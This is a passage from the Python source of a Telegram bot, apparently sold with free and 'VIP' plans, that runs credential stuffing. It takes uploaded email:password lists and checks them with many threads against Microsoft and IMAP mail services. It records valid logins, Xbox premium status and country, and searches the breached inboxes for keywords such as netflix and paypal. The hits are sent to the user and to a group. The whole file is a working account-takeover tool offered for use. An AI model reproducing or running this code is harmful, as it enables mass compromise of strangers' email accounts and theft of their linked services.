                        r = checker.check(em, pw, target_keywords=sess.target_keywords)
                    except:
                        r = {"status": "BAD"}
                    if sess.stop_ev.is_set():
                        return
                    with self.lock:
                        sess.checked += 1
                        sess.mix_checked += 1
                    if r and r.get("status") == "HIT":
                        line = f"{em}:{pw}"
                        sv = r.get("services", {}) or {}
                        sv_found = [k for k, v in sv.items() if v]
                        if sv_found:
                            line += f" | Services: {', '.join(sv_found)}"
                        dom = em.split("@")[-1].lower()
                        # Keyword counts for this MIX hit
                        kw_counts = r.get("kw_counts", {})
                        kw_found = {kw: c for kw, c in kw_counts.items() if c > 0}
                        with self.lock:
                            sess.results.append(line)
                            sess.hits += 1
                            sess.mix_hits += 1
                            sess.imap_hits_by_domain[dom] = sess.imap_hits_by_domain.get(dom, 0) + 1
                            for k, v in sv.items():
                                if v:
                                    sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
                                    sess.mix_service_counts[k] = sess.mix_service_counts.get(k, 0) + 1
                            # Update target keyword counters
                            for kw in kw_found:
                                sess.mix_target_counts[kw] = sess.mix_target_counts.get(kw, 0) + 1
                        with sess.hits_batch_lock:
                            sess.batch_mix.append(line)  # MIX separate batch
                            # Also add to target batch if any keyword matched
                            if kw_found and sess.target_keywords:
                                kw_str = ", ".join([f"{kw}({c})" for kw, c in kw_found.items()])
                                target_line = f"{line} | target: {kw_str}"
                                sess.batch_target_mix.append(target_line)
                            # Flush MIX every 100 hits
                            if sess.mix_hits - sess.mix_hits_last_flush >= 100:
                                sess.mix_hits_last_flush = sess.mix_hits
                                self._flush_batch(sess, chat_id, flush_all=False)
                    else:
                        with self.lock:
                            sess.bads += 1
                            sess.mix_bads += 1
                else:
                    # -------- Microsoft branch --------
                    try:
                        checker = UnifiedChecker(debug=False)
                        if getattr(sess, "custom_domains", None):
                            for dom in sess.custom_domains:
                                d = dom.strip()
                                if d:
                                    checker.services_map[d] = d
                        elif sess.custom_domain:
                            checker.services_map[sess.custom_domain.strip()] = "Custom"
                        r = checker.check(em, pw)
                    except:
                        r = {"status": "BAD"}
                    if sess.stop_ev.is_set():
                        return
                    with self.lock:
                        sess.checked += 1
                        sess.ms_checked += 1
                    if r and r.get("status") == "HIT":
                        line = format_result(r)
                        sv = r.get("services", {}) or {}
                        xbox_line = None
                        xb = (r.get("xbox") or {})
                        xdet = xb.get("details") or ""
                        if (xb.get("status","").upper() != "FREE") and xdet:
                            xbox_line = f"{r.get('email','')}:{r.get('password','')} | Xbox: {xdet}"
                        # Target keyword check using already-obtained access token
                        kw_found = {}
                        if sess.target_keywords:
                            at = r.get("_access_token", "")
                            cid = r.get("_cid", "")
                            if at:
                                try:
                                    for kw in sess.target_keywords:
                                        count = checker._search_count(at, cid, kw, timeout=8)
                                        if count > 0:
                                            kw_found[kw] = count
                                except: pass
                        with self.lock:
                            sess.results.append(line)
                            sess.hits += 1
                            sess.ms_hits += 1
                            if xbox_line:
                                sess.results_xbox.append(xbox_line)
                            xb_status = (r.get("xbox") or {}).get("status", "").upper()
                            if xb_status and xb_status != "FREE":
                                sess.xbox_premium += 1
                            c = (r.get("country") or "??").strip().upper()
                            sess.country_counts[c] = sess.country_counts.get(c, 0) + 1
                            if c not in sess.country_results:
                                sess.country_results[c] = []
                            sess.country_results[c].append(line)
                            for k, v in sv.items():
                                if v:
                                    sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
                                    sess.ms_service_counts[k] = sess.ms_service_counts.get(k, 0) + 1
                            # Update target keyword counters
                            for kw in kw_found:
                                sess.ms_target_counts[kw] = sess.ms_target_counts.get(kw, 0) + 1
                        with sess.hits_batch_lock:
                            sess.batch.append(line)   # MS hits batch
                            if xbox_line:
                                sess.batch_xbox.append(xbox_line)
                            # Also add to target batch if any keyword matched
                            if kw_found and sess.target_keywords:
                                kw_str = ", ".join([f"{kw}({c})" for kw, c in kw_found.items()])
                                target_line = f"{line} | target: {kw_str}"
                                sess.batch_target_ms.append(target_line)
                            # Flush MS every 100 hits
                            if sess.ms_hits - sess.ms_hits_last_flush >= 100:
                                sess.ms_hits_last_flush = sess.ms_hits
                                self._flush_batch(sess, chat_id, flush_all=False)
                    else:
                        with self.lock:
                            sess.bads += 1
                            sess.ms_bads += 1
                if sess.checked % 20 == 0:
                    self._send_status(sess, chat_id)
            max_w = max(16, min(128, (os.cpu_count() or 4) * 8))
            ex = ThreadPoolExecutor(max_workers=max_w)
            fs = [ex.submit(worker, acc) for acc in sub_accounts]
            try:
                pending = set(fs)
                while pending and not sess.stop_ev.is_set():
                    done = {f for f in list(pending) if f.done()}
                    pending -= done
                    self._send_status(sess, chat_id)
                    time.sleep(0.3)
            finally:
                try: ex.shutdown(wait=False, cancel_futures=True)
                except: pass

        chunks_dir = os.path.join(os.getcwd(), f"scan_chunks_{chat_id}_{uuid.uuid4().hex[:6]}")
        try:
            os.makedirs(chunks_dir, exist_ok=True)
            sess.chunks_dir = chunks_dir
        except:
            sess.chunks_dir = None
        chunk_paths = []
        for i in range(0, len(accounts), 100):
            sub = accounts[i:i+100]
            p = os.path.join(chunks_dir, f"chunk_{(i//100)+1}.txt") if sess.chunks_dir else None
            if p:
                try:
                    with open(p, "w", encoding="utf-8") as f:
                        for em, pw in sub:
                            f.write(f"{em}:{pw}\n")
                    chunk_paths.append(p)
                except:
                    chunk_paths = []
                    break
        if chunk_paths:
            for cp in chunk_paths:
                if sess.stop_ev.is_set():
                    break
                try:
                    with open(cp, "r", encoding="utf-8") as f:
                        lines = [ln.strip() for ln in f if ln.strip()]
                    subs = []
                    for ln in lines:
                        if ":" in ln:
                            parts = ln.split(":", 1)
                            em = parts[0].strip()
                            pw = parts[1].strip()
                            if em and pw:
                                subs.append((em, pw))
                    if subs:
                        run_batch(subs)
                finally:
                    try: os.remove(cp)
                    except: pass
            try:
                if sess.chunks_dir and os.path.isdir(sess.chunks_dir):
                    os.rmdir(sess.chunks_dir)
            except: pass
        else:
            run_batch(accounts)
        self.finish(chat_id)

    def finish(self, chat_id):
        with self.lock:
            sess = self.sessions.get(chat_id)
        if not sess:
            return
        self._flush_batch(sess, chat_id, flush_all=True)
        try:
            vip_tag = " [VIP]" if chat_id in vip_users_info else ""
            user_tag = sess.username or str(chat_id)
            summary = f"Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}"

            def _send_final_file(lines, file_prefix, caption_user, caption_group):
                if not lines:
                    return
                try:
                    fname = f"{file_prefix}_{uuid.uuid4().hex[:8]}.txt"
                    fpath = os.path.join(os.getcwd(), fname)
                    with open(fpath, "w", encoding="utf-8") as f:
                        for ln in lines:
                            f.write(ln + " | BY : @T_Q_mailbot\n")
                    send_document(chat_id, fpath, caption=caption_user)
                    try:
                        send_document(GROUP_ID, fpath, caption=f"{user_tag}{vip_tag} | {caption_group}")
                    except: pass
                    try: os.remove(fpath)
                    except: pass
                except: pass

            # Separate MS hits
            ms_results = [ln for ln in sess.results if not getattr(sess, '_is_mix_line', lambda l: False)(ln)]
            # Build ms vs mix result lists
            ms_lines = []
            mix_lines = []
            all_mix_emails = {ln.split(":")[0].lower() for ln in (sess.batch_mix or []) if ":" in ln}
            for ln in sess.results:
                em = ln.split(":")[0].lower().strip()
                if em in all_mix_emails or any(d in em for d in ('gmail.', 'yahoo.', 'icloud.', 'aol.', 'yandex.', 'mail.ru', 'gmx.', 'web.de', 'fastmail.', 'zoho.')):
                    mix_lines.append(ln)
                else:
                    ms_lines.append(ln)

            _send_final_file(ms_lines, "ms_hits_final",
                             f"✅ Microsoft Hits | {summary}",
                             f"Microsoft Hits | {summary}")
            _send_final_file(mix_lines, "mix_hits_final",
                             f"✅ MIX / IMAP Hits | Hits: {sess.mix_hits} | Bads: {sess.mix_bads}",
                             f"MIX Hits | {sess.mix_hits} hits")
            # Xbox premium separate
            if sess.results_xbox:
                _send_final_file(sess.results_xbox, "xbox_final",
                                 f"🎮 Xbox Premium | {len(sess.results_xbox)} hits",
                                 f"Xbox Premium | {len(sess.results_xbox)}")
            # Target keyword results (if any)
            if sess.target_keywords:
                kw_label = ", ".join(sess.target_keywords[:3])
                # Collect target lines from all hits
                target_lines_ms = list(sess.batch_target_ms) if sess.batch_target_ms else []
                target_lines_mix = list(sess.batch_target_mix) if sess.batch_target_mix else []
                if target_lines_ms:
                    _send_final_file(target_lines_ms, "target_ms_final",
                                     f"🎯 MS Target [{kw_label}] | {len(target_lines_ms)} matches",
                                     f"MS Target [{kw_label}] | {len(target_lines_ms)}")
                if target_lines_mix:
                    _send_final_file(target_lines_mix, "target_mix_final",
                                     f"🎯 MIX Target [{kw_label}] | {len(target_lines_mix)} matches",
                                     f"MIX Target [{kw_label}] | {len(target_lines_mix)}")
        except:
            send_message(chat_id, "Failed to prepare results")
        # VIP reminder: unlimited plan
        if chat_id in vip_users_info:
            send_message(chat_id, "You can send more files — your plan is unlimited.")
        with self.lock:
            self.sessions.pop(chat_id, None)

    def handle_file(self, chat_id, file_id, username=None):
        data = get_file(file_id)
        if not data:
            send_message(chat_id, "Cannot download file")
            return
        
        accounts = parse_accounts_bytes(data)
        if not accounts:
            send_message(chat_id, "No valid accounts found")
            return
        
        with self.lock:
            sess = self.sessions.get(chat_id)
            if not sess:
                sess = ScanSession(chat_id)
                self.sessions[chat_id] = sess
        if not sess.username:
            sess.username = username or str(chat_id)
        
        sess.pending_accounts = accounts

        if chat_id in vip_users_info:
            # Ask VIP user for target keywords first
            kb = {"inline_keyboard": [[{"text": "⏭ Skip (no target)", "callback_data": f"SKIP_TARGET_{chat_id}"}]]}
            sess.awaiting_target_keywords = True
            send_message(chat_id,
                "🎯 Send your target keywords (comma separated):\n"
                "Example: netflix, facebook.com, paypal\n\n"
                "Or press skip to scan without a target.",
                reply_markup=kb)
        else:
            self._handle_free_flow(chat_id, sess)

    def _handle_mode_select(self, chat_id, mode):
        with self.lock:
            sess = self.sessions.get(chat_id)
            if not sess: return
        
        if mode == "MS":
            sess.is_imap = False
            sess.pending_accounts = sess.accounts_microsoft
        else:
            sess.is_imap = True
            sess.pending_accounts = sess.accounts_another
            
        if sess.plan == "free":
            self._handle_free_flow(chat_id, sess)
        elif sess.plan == "vip":
            if chat_id in vip_users_info:
                self._handle_vip_flow(chat_id, sess)
            else:
                sess.awaiting_vip_code = True
                kb = {"inline_keyboard": [[{"text": "Cancel", "callback_data": f"PLAN_CANCEL_{chat_id}"}]]}
                send_message(chat_id, "Please enter your VIP code:", reply_markup=kb)
        else:
            kb = {
                "inline_keyboard": [
                    [{"text": "Free ( 100 acc every 2hr )", "callback_data": f"PLAN_FREE_{chat_id}"}],
                    [{"text": "Vip ( unlimited check )", "callback_data": f"PLAN_VIP_{chat_id}"}]
                ]
            }
            send_message(chat_id, "Choose your plan to start:", reply_markup=kb)

    def _handle_vip_flow(self, chat_id, sess):
        accounts = sess.pending_accounts
        t = threading.Thread(target=self.start_scan, args=(chat_id, accounts), daemon=True)
        t.start()

    def _handle_free_flow(self, chat_id, sess):
        accounts = sess.pending_accounts
        allow, mins = check_user_limit(chat_id, 0)
        send_message(chat_id, "your plan is free\n100 accounts\nevery 2hr\nif you want unlimited check , send msg here : @anon_101")
        
        rec = user_usage.get(chat_id) or {}
        prev_count = rec.get("count", 0)
        remaining = NORMAL_LIMIT - prev_count
        
        if remaining <= 0:
            try:
                now = time.time()
                start_ts = rec.get("start", now)
                mins_left = max(1, int((VIP_WINDOW_SECONDS - (now - start_ts)) / 60) + 1)
            except:
                mins_left = 120
            send_message(chat_id, f"Limit reached. Try again in ~{mins_left} minutes.")
            return
            
        to_scan = accounts[:remaining]
        allow, _ = check_user_limit(chat_id, len(to_scan))
        if not allow or not to_scan:
            send_message(chat_id, "Limit reached.")
            return
            
        if prev_count == 0 and len(to_scan) > 0:
            schedule_limit_reset_message(chat_id)
            
        t = threading.Thread(target=self.start_scan, args=(chat_id, to_scan), daemon=True)
        t.start()


    def handle_stop(self, chat_id):
        with self.lock:
            sess = self.sessions.get(chat_id)
        if not sess:
            send_message(chat_id, "No running scan")
            return
        sess.stop()
        send_message(chat_id, "Stopping, preparing results...")

    def run(self):
        global awaiting_broadcast
        if not BOT_TOKEN:
            print("Set TELEGRAM_BOT_TOKEN env")
            return
        try:
            drop_env = os.getenv("DROP_PENDING_UPDATES", "true").strip().lower()
            if drop_env in ("1", "true", "yes", "y", "on"):
                j = get_updates(None, timeout=0)
                max_id = None
                for upd in j.get("result", []):
                    uid = upd.get("update_id")
                    if isinstance(uid, int):
                        max_id = uid if max_id is None else max(max_id, uid)
                if max_id is not None:
                    self.offset = max_id + 1
        except:
            pass
        while True:
            try:
                j = get_updates(self.offset, timeout=50)
                if not j.get("ok"):
                    time.sleep(2)
                    continue
                for upd in j.get("result", []):
                    self.offset = upd["update_id"] + 1
                    if "message" in upd:
                        m = upd["message"]
                        chat_id = m["chat"]["id"]
                        from_id = m.get("from", {}).get("id")
                        all_users.add(chat_id)
                        
                        # ADMIN Commands
                        if chat_id == ADMIN_ID and "text" in m:
                            txt = m["text"].strip().lower()
                            if txt in ("/start", "start", "/admin", "admin", "/panel", "panel"):
                                kb = {
                                    "inline_keyboard": [
                                        [{"text": "code 1 day", "callback_data": "GEN_CODE_day"}],
                                        [{"text": "code 1 week", "callback_data": "GEN_CODE_week"}],
                                        [{"text": "code 1 month", "callback_data": "GEN_CODE_month"}],
                                        [{"text": "Broadcast", "callback_data": "ADMIN_BROADCAST"}],
                                        [{"text": "VIP Users", "callback_data": "ADMIN_VIP_LIST"}]
                                    ]
                                }
                                send_message(chat_id, "Admin Panel: Generate VIP codes", reply_markup=kb)
                                # continue to show regular start if needed, but usually admin wants this
                            elif awaiting_broadcast:
                                msg_to_send = m["text"]
                                for uid in list(all_users):
                                    try:
                                        send_message(uid, msg_to_send)
                                    except:
                                        pass
                                awaiting_broadcast = False
                                send_message(chat_id, "Broadcast sent")
                            
                        if "document" in m:
                            fid = m["document"]["file_id"]
                            # announce to group who started
                            try:
                                usr = m.get("from", {})
                                uname = usr.get("username") or f"{usr.get('first_name','')}".strip() or str(chat_id)
                                send_message(GROUP_ID, f"Scan started by @{uname} (chat:{chat_id})")
                            except Exception:
                                pass
                            self.handle_file(chat_id, fid, uname if 'uname' in locals() else None)
                        elif "text" in m:
                            txt = m["text"].strip()
                            
                            # Handle VIP code entry
                            with self.lock:
                                sess = self.sessions.get(chat_id)
                            if sess and sess.awaiting_vip_code:
                                if txt.lower() == "cancel":
                                    sess.awaiting_vip_code = False
                                    self._handle_free_flow(chat_id, sess)
                                else:
                                    ok, msg = try_claim_vip(chat_id, txt)
                                    send_message(chat_id, msg)
                                    if ok:
                                        sess.awaiting_vip_code = False
                                        if sess.pending_accounts:
                                            self._handle_vip_flow(chat_id, sess)
                                        else:
                                            send_message(chat_id, "Send the file to start")
                                continue

                            # Handle VIP target keyword entry
                            if sess and getattr(sess, "awaiting_target_keywords", False):
                                if txt.lower() == "skip":
                                    sess.awaiting_target_keywords = False
                                    sess.target_keywords = []
                                    if sess.pending_accounts:
                                        t = threading.Thread(target=self.start_scan, args=(chat_id, sess.pending_accounts), daemon=True)
                                        t.start()
                                else:
                                    parts = re.split(r'[,\u060C،]+', txt)
                                    kws = [p.strip() for p in parts if p.strip()]
                                    if not kws:
                                        send_message(chat_id, "Please send at least one keyword, or type skip.")
                                    else:
                                        sess.awaiting_target_keywords = False
                                        sess.target_keywords = kws
                                        kw_display = ", ".join(kws)
                                        send_message(chat_id, f"✅ Target set: {kw_display}\nStarting scan...")
                                        if sess.pending_accounts:
                                            t = threading.Thread(target=self.start_scan, args=(chat_id, sess.pending_accounts), daemon=True)
                                            t.start()
                                continue

                            if txt.lower() in ("/start", "start"):
                                kb = {
                                    "inline_keyboard": [
                                        [{"text": "🔑 Enter VIP Code", "callback_data": "VIP_CODE_ENTER"}]
                                    ]
                                }
                                send_message(chat_id, "Welcome to Q Bot\nIf you have a VIP code, press the button below.\nIf you don't have a code, send the file for checking directly.", reply_markup=kb)
                                continue
                            # user claims VIP code
                            if txt.lower().startswith("code") or txt.lower().startswith("vip") or txt.lower() == "codevipanon199":
                                parts = txt.replace(":", " ").split()
                                code = parts[-1] if len(parts) >= 1 else ""
                                ok, msg = try_claim_vip(from_id, code)
                                send_message(chat_id, msg)
                                if ok:
                                    kb = {"inline_keyboard": [[{"text": "Search", "callback_data": "VIP_SEARCH"}]]}
                                    send_message(chat_id, "VIP activated. Please send a text file (email:pass per line) to begin scanning.\nYou can also use VIP search.", reply_markup=kb)
                                continue
                            if txt.lower() == "stop":
                                self.handle_stop(chat_id)
                                continue
                            # handle domain input
                            if sess and getattr(sess, "awaiting_domain", False) and sess.pending_accounts:
                                if txt.lower() != "skip":
                                    parts = re.split(r'[,\u060C]+', txt)
                                    sess.custom_domains = [p.strip() for p in parts if p.strip()]
                                    sess.custom_domain = None
                                sess.awaiting_domain = False
                                accs = sess.pending_accounts
                                sess.pending_accounts = None
                                t = threading.Thread(target=self.start_scan, args=(chat_id, accs), daemon=True)
                                t.start()
                            # handle VIP search keywords
                            if sess and getattr(sess, "awaiting_search", False):
                                if chat_id not in vip_users_info:
                                    send_message(chat_id, "VIP required for search.")
                                else:
                                    parts = re.split(r'[,\u060C]+', txt)
                                    kws = [p.strip() for p in parts if p.strip()]
                                    if not kws:
                                        send_message(chat_id, "Send keywords separated by commas.")
                                    else:
                                        sess.awaiting_search = False
                                        sess.search_keywords = kws
                                        if sess.pending_accounts:
                                            t = threading.Thread(target=self.start_search, args=(chat_id, sess.pending_accounts, kws), daemon=True)
                                            t.start()
                                        else:
                                            send_message(chat_id, "Send the accounts file first, then press Search.")
                                continue
                    elif "callback_query" in upd:
                        cq = upd["callback_query"]
                        data = cq.get("data", "")
                        chat_id = cq["message"]["chat"]["id"]
                        
                        # ADMIN Callbacks
                        if chat_id == ADMIN_ID and data.startswith("GEN_CODE_"):
                            dur = data.split("_")[2]
                            code = create_vip_code(dur)
                            send_message(chat_id, f"Generated {dur} code: `{code}`\n(Click to copy)")
                            continue
                        if chat_id == ADMIN_ID and data == "ADMIN_BROADCAST":
                            awaiting_broadcast = True
                            send_message(chat_id, "Send the message to broadcast")
                            continue
                        if chat_id == ADMIN_ID and data == "ADMIN_VIP_LIST":
                            if not vip_users_info:
                                send_message(chat_id, "No VIP users")
                            else:
                                send_message(chat_id, f"VIP Users: {len(vip_users_info)}")
                                for uid, info in list(vip_users_info.items()):
                                    rem = max(0, int((info.get("expires", 0) - time.time()) / 3600))
                                    send_message(chat_id, f"User: {uid}\nCode: {info.get('code','')}\nRemaining: {rem}h", reply_markup={"inline_keyboard": [[{"text": "Revoke", "callback_data": f"REVOKE_{uid}"}]]})
                            continue

                        if data.startswith("STOP_"):
                            self.handle_stop(chat_id)
                        elif data.startswith("SKIP_TARGET_"):
                            with self.lock:
                                sess = self.sessions.get(chat_id)
                            if sess and getattr(sess, "awaiting_target_keywords", False):
                                sess.awaiting_target_keywords = False
                                sess.target_keywords = []
                                if sess.pending_accounts:
                                    send_message(chat_id, "⏭ No target set. Starting scan...")
                                    t = threading.Thread(target=self.start_scan, args=(chat_id, sess.pending_accounts), daemon=True)
                                    t.start()
                        elif data == "VIP_CODE_ENTER":
                            with self.lock:
                                sess = self.sessions.get(chat_id) or ScanSession(chat_id)
                                self.sessions[chat_id] = sess
                            sess.awaiting_vip_code = True
                            kb = {"inline_keyboard": [[{"text": "❌ Cancel", "callback_data": f"PLAN_CANCEL_{chat_id}"}]]}
                            send_message(chat_id, "🔑 Please enter your VIP code:", reply_markup=kb)
                        elif data == "VIP_SEARCH":
                            if chat_id in vip_users_info:
                                with self.lock:
                                    sess = self.sessions.get(chat_id) or ScanSession(chat_id)
                                    self.sessions[chat_id] = sess
                                    sess.awaiting_search = True
                                send_message(chat_id, "Send search keywords (comma separated), e.g.: paypal, steam, netflix")
                            else:
                                send_message(chat_id, "VIP required for search.")
                        elif data.startswith("MODE_SELECT_MS_"):
                            self._handle_mode_select(chat_id, "MS")
                        elif data.startswith("MODE_SELECT_IMAP_"):
                            self._handle_mode_select(chat_id, "IMAP")
                        elif data.startswith("PLAN_FREE_"):
                            with self.lock:
                                sess = self.sessions.get(chat_id)
                            if sess:
                                sess.plan = "free"
                                if not sess.pending_accounts:
                                    send_message(chat_id, "Send the file to start")
                                else:
                                    self._handle_free_flow(chat_id, sess)
                        elif data.startswith("PLAN_VIP_"):
                            with self.lock:
                                sess = self.sessions.get(chat_id)
                            if sess:
                                sess.plan = "vip"
                                sess.awaiting_vip_code = True
                                kb = {"inline_keyboard": [[{"text": "Cancel", "callback_data": f"PLAN_CANCEL_{chat_id}"}]]}
                                send_message(chat_id, "Please enter your VIP code:", reply_markup=kb)
                        elif data.startswith("PLAN_CANCEL_"):
                            with self.lock:
                                sess = self.sessions.get(chat_id)
                            if sess:
                                sess.awaiting_vip_code = False
                                sess.plan = "free"
                                self._handle_free_flow(chat_id, sess)
                        elif data.startswith("REVOKE_"):
                            if chat_id == ADMIN_ID:
                                uid = int(data.split("_")[1])
                                vip_users_info.pop(uid, None)
                                send_message(chat_id, f"Revoked VIP for {uid}")
                        elif data.startswith("SKIP_"):
                            with self.lock:
                                sess = self.sessions.get(chat_id)
                            if sess and getattr(sess, "awaiting_domain", False) and sess.pending_accounts:
                                sess.awaiting_domain = False
                                accs = sess.pending_accounts
                                sess.pending_accounts = None
                                t = threading.Thread(target=self.start_scan, args=(chat_id, accs), daemon=True)
                                t.start()
                        elif data == "MODE_MAIL":
                            with self.lock:
                                sess = self.sessions.get(chat_id) or ScanSession(chat_id)
                                self.sessions[chat_id] = sess
                            kb = {
                                "inline_keyboard": [
                                    [{"text": "Free ( 100 acc every 2hr )", "callback_data": f"PLAN_FREE_{chat_id}"}],
                                    [{"text": "Vip ( unlimited check )", "callback_data": f"PLAN_VIP_{chat_id}"}]
                                ]
                            }
                            send_message(chat_id, "Choose your plan to start:", reply_markup=kb)
            except KeyboardInterrupt:
                break
            except Exception:
                time.sleep(2)

if __name__ == "__main__":
    BotApp().run()
